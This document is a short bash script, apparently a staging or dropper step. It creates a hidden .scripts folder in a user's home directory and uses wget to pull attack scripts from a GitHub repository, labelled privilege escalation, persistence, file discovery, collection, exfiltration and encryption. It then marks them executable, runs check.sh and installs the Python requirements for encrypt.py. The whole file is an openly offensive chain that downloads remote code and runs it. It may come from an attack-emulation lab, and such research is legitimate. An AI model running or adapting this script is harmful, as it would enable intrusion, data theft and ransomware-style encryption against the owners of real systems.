#!/bin/bash
cd /home/resch
# Create hidden folder
mkdir .scripts
cd /home/resch/.scripts
#PE
wget https://github.com/S692/ossas/blob/main/attackScripts/PEexploit.sh
# Persistence
wget https://github.com/S692/ossas/blob/main/attackScripts/persistence1.sh
wget https://github.com/S692/ossas/blob/main/attackScripts/persistence2.sh
# File discovery
wget https://github.com/S692/ossas/blob/main/attackScripts/file_and_dir_discovery.sh
wget https://github.com/S692/ossas/blob/main/attackScripts/file_and_dir_discovery-stripped.sh
# Collection
wget https://github.com/S692/ossas/blob/main/attackScripts/collectiontarget.sh
# Exfiltration
wget https://github.com/S692/ossas/blob/main/attackScripts/exfiltration_attk.sh
# Encryption
wget https://github.com/S692/ossas/blob/main/attackScripts/encryption/check.sh
# Chmod execute
chmod -R +x /home/resch/.scripts
# Other files
wget https://github.com/S692/ossas/blob/main/attackScripts/encryption/requirements.txt
wget https://github.com/S692/ossas/blob/main/attackScripts/encryption/encrypt.py
# Install requirements
./check.sh
pip3 install -r ./requirements.txt
